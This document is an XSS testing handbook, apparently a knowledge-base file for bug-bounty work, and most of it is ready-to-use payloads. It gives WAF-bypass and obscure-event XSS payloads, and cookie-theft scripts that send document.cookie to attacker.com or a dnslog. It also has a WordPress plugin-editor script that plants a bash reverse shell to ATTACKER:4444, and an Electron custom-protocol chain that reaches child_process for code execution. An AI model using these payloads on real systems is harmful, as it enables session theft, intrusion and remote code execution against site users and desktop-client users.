> Search by title for the short tables "XSS → RCE" and "Custom Protocol → RCE". The English appendix / polyglot encyclopedia have been cut; obscure events and privileged contexts remain.
> **The payloads below are just a head start, not a checklist.** Choose and adapt them yourself based on the on-site context; encodings/events/tags not in the tables work just as well. Do not limit yourself to polling only the few collected in this section.

## I. Original Knowledge Base

# XSS Testing Handbook

## Determining XSS Type

| Type | Characteristic |
|------|----------------|
| Stored | payload is saved to the database, triggered when others visit |
| Reflected | payload is in a URL parameter, requires inducing a click |
| DOM | purely front-end processing, never reaches the server |

Once exploited, rate severity per `vuln-report-format`, not by stored/reflected/DOM.

---

## Common Injection Points

```
Search box → search results page
Comments / message boards
User profiles (nickname, signature, bio)
File names (displayed after upload)
404 / error pages (show URL parameters)
Notification content
Customer service chat
Rich text editors
Git / documentation sites: README, Wiki, issues, MR descriptions (test both web and desktop clients, see §8 XSS→RCE)
Desktop client custom protocols (scheme params carrying url / open / openUrl / webview, see §8 Custom Protocol→RCE)
Redirect params backUrl / returnUrl / redirect / next (javascript: or javascript%3A + document.write(document.cookie))
Rich text / BBCode / wiki (`[p]` `[[p]]` `[div]` keep attributes when converted to HTML; if the page has Layui/animate.css, attach an existing animation class + onanimationstart)
```

---

## Basic Payloads

```html
<!-- Basic verification -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- No script tag -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<details open ontoggle=alert(1)>

<!-- Attribute injection (closing the attribute) -->
" onmouseover="alert(1)
' onmouseover='alert(1)
"><img src=x onerror=alert(1)>
```

---

## WAF Bypass Payloads

```html
<!-- Mixed case -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=X ONERROR=alert(1)>

<!-- Event variety -->
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Obscure auto events: use when onerror/onload are stripped. Unknown tags work too. In inline scope, cookie is document.cookie -->
<c2xh oncontentvisibilityautostatechange=a=alert,a(cookie) style=display:block;content-visibility:auto>
<!-- If unknown tags are stripped, switch to input; with content-visibility:auto you don't need display:block -->
<input style=content-visibility:auto oncontentvisibilityautostatechange="alert(1)">
<!-- Popover: switch to this when style is stripped. Requires a button click. In inline scope, URL is document.URL -->
<button popovertarget=x>Click me</button><c2xl onbeforetoggle=a=alert,a(URL) popover id=x>Go</c2xl>

<!-- Encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="javascript:\u0061lert(1)">click</a>

<!-- Comment splitting -->
<scr<!--comment-->ipt>alert(1)</scr<!--comment-->ipt>

<!-- Using backticks -->
<img src=`x` onerror=alert(1)>
```

---

## Cookie Theft Payloads

```html
<!-- Send cookies to attacker server -->
<script>
new Image().src="https://attacker.com/steal?c="+encodeURIComponent(document.cookie)
</script>

<!-- fetch version (more reliable) -->
<script>
fetch("https://attacker.com/steal",{method:"POST",body:document.cookie})
</script>

<!-- SRC verification (no real receiver needed, a dnslog will do) -->
<script>
document.write('<img src="http://'+document.cookie.split(';')[0].split('=')[1]+'.your-dnslog.cn">')
</script>
```

---

## Finding DOM XSS

```javascript
// Search for dangerous sinks
search_in_sources("innerHTML")
search_in_sources("document.write")
search_in_sources("eval(")
search_in_sources("location.hash")
search_in_sources("location.search")

// Common DOM XSS sources
document.location.hash    // content after #
document.location.search  // parameters after ?
document.referrer
window.name
postMessage
```

---

## Proving XSS (SRC requirements)

For SRC submissions, **do not use alert(1)** to prove impact; use:

```javascript
// Prove you can read cookies
alert(document.cookie)
// In inline events you can write a=alert,a(cookie) or a=alert,a(URL) (scope is document.cookie / document.URL)

// Prove you can read tokens (localStorage)
alert(localStorage.getItem('token') || sessionStorage.getItem('token'))

// Prove domain (to show it isn't self-xss)
alert(document.domain)
```

---

### Obscure Events + Inline Scope (when onerror/onload are blocked)

Any tag name works (unknown elements like `c2xh` / `c2xl` work too). The inline event scope can reach `document`: `cookie` = `document.cookie`, `URL` = `document.URL`. When `document` / `alert(1)` are blocked, use `a=alert,a(cookie)` or `a=alert,a(URL)`.

No click needed (when `style` is still present):

```html
<c2xh oncontentvisibilityautostatechange=a=alert,a(cookie) style=display:block;content-visibility:auto>
<input style=content-visibility:auto oncontentvisibilityautostatechange="alert(1)">
```

If unknown tags are stripped, switch to `input` / `p` (or another allowlisted tag). On `input`, often just `content-visibility:auto` is enough — no need to add `display:block`. If `alert(1)` passes, use it first; if blocked, switch to `a=alert,a(cookie)`.

If rich text / BBCode / wiki converts `[p]`, `[[p]]`, `[div]` to corresponding HTML and carries attributes over verbatim, attach directly to the allowed tags:

```
[[p oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto][/p]]
[div onmousemove=eval.call`${'al\x65rt(1)'}` style=position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999][/div]
```

`onmousemove` requires a click/mouse movement; `position:fixed` covering the screen ensures any mouse movement triggers it. `eval.call\`...\`` calls `eval` via a tagged template; `\x65` is `e`, dodging the literal `alert`. Don't use this if an automatic event works.

When `onerror`/`onload` are stripped and automatic events don't fire either, switch to pointer events + enlarge the element so it triggers on mouse entry (URL encoding is common):

```
<svg%20id%3dmySvg%20onpointerenter%3da=alert,a(cookie)%20width%3d10000%20height%3d10000></svg>%2F%2F
```

Decoded, it's `<svg id=mySvg onpointerenter=a=alert,a(cookie) width=10000 height=10000></svg>//`. The trailing `//` comments out whatever remains after the injection point. False negatives: mouse never entered the huge svg; tag/event stripped.

When the page already includes ready-made animations like Layui / animate.css, attach a class from the library and let `onanimationstart` fire automatically — no need to write your own `@keyframes`:

```
[div class=layui-anim-up onanimationstart=javascript:alert(1)][/div]
```

When writing `javascript:alert(1)` in an event handler, `javascript:` is a JS label, so the following `alert(1)` still runs — it's not a URL protocol. False negatives: the page doesn't have that CSS; class / event stripped; animation didn't play.

False negatives: only the tag name changed and attributes were stripped; it converts to plain text; mouse never moved; `style` stripped leaving only a small block requiring precise hovering; CSP blocks `eval`. Things like "Life: face" above are just body text, not part of the payload.

When `style` / `content-visibility` are stripped, switch to Popover — requires one button click. `popovertarget` matches `id`, `onbeforetoggle` fires just before the popover opens:

```html
<button popovertarget=x>Click me</button><c2xl onbeforetoggle=a=alert,a(URL) popover id=x>Go</c2xl>
```

Prefer Chrome / Edge. Firefox and Safari often don't respond to these APIs; switch to another event — this isn't a dead end. For the Popover approach, not clicking the button doesn't count as a successful exploit.

## 8. XSS → RCE / Custom Protocol (short table has pointers)

### XSS → RCE (privileged context; an escalation of the same chain as the cookie theft above)

After exploiting stored/reflected XSS, or after Electron pulls an external page into a privileged window, the question is: **whose process is this JS running in**. In a web page it's just a session; RCE only happens when it lands somewhere that can write plugins or call a native bridge. The following are the same category, not mutually exclusive.

**Web admin panels (WordPress, etc.)**: an admin session + an editor that can modify plugins/themes. Hello Dolly is just a ready-made file; other writable entry points are exploited the same way.

```javascript
p = '/wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?=`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`;?>';
a = new XMLHttpRequest();
a.open('GET', p+q, 0); a.send();
$ = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
    '&newcontent=' + encodeURIComponent(s) + '&action=update&' + q;
b = new XMLHttpRequest();
b.open('POST', p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send($);
b.onreadystatechange = function(){ if(this.readyState==4) fetch('/wp-content/plugins/hello.php'); }
```

**Desktop clients (CEF / Electron / enterprise Git GUI)**: with a node bridge / `nodeIntegration` / `enableRemoteModule` / exposed `Buffer`·`require`·`child_process`, the JS in the page runs in the native process. Choose the payload based on the situation (auto-redirect, external link, events, remote page); **don't blindly copy one particular gadget**. If the sandbox is dead → keep exploiting the web app as ordinary stored XSS; don't declare this path dead.

Delivery 1 (stored XSS): HTML stored in READMEs, issues, or comments is rendered by the client as a web page. If the member/invite API only accepts numeric `user_id`, just increment to add people (the sequential ID + batch-write already in `idor-test.md`). If the other party's clone list isn't isolated, your repo will appear in their client, and opening the README triggers it. Adding people isn't the core of the bug; the core is still the client rendering HTML into a privileged XSS.

### Custom Protocol → RCE (short table has pointers)

Delivery 2 (custom protocol, no stored XSS needed): the client registers its own scheme. On macOS check `Info.plist` for `CFBundleURLSchemes`; on Windows check the protocol registered at install time; search the packaged JS for `setAsDefaultProtocolClient` / `open-url` / `second-instance`. If the protocol parameters contain `url`, `urlType`, `open`, `openUrl`, `webview`, try stuffing an external site address in. Two common forms (follow the field names on site, don't copy blindly):

- JSON: `scheme://app/open?params={"url":"http://attacker","urlType":1}`
- Flat: `scheme://openUrl?url=http://attacker/exp.html`

Open it from the browser address bar or any `href`; the system will ask "Do you want to open this application?" — one click from the other party counts as reasonable interaction, no man-in-the-middle needed.

The attack page first probes the bridge, then pops the calculator. Don't stop just because it's Electron 18+ or there's no `remote`. Order: `typeof process` → `typeof require` (only trust it if `require.toString()` contains `native`) → `window.require` → if none, check the preload bridge / `window.electron.ipcRenderer`. If `require` can reach `child_process` directly, use it; only older windows go through:

```
const {remote} = require('electron');
remote.require('child_process').exec('open -a Calculator');
```

On Windows replace the command with `calc`. If the preload only exposes `ipcRenderer` and can't invoke commands → this bridge isn't exploited, don't write it up as RCE.

Counts as: calculator popped locally / your specified harmless command executed. If it only alerts in the browser, the client doesn't render, it only shows "open application" but doesn't load the external site, or it redirects but doesn't execute → stop at invocation / stored XSS, don't write it up as RCE. If the protocol only opens its own domain and neither `require` nor `remote` exists → this delivery ends here; switch to Delivery 1 or the web page.
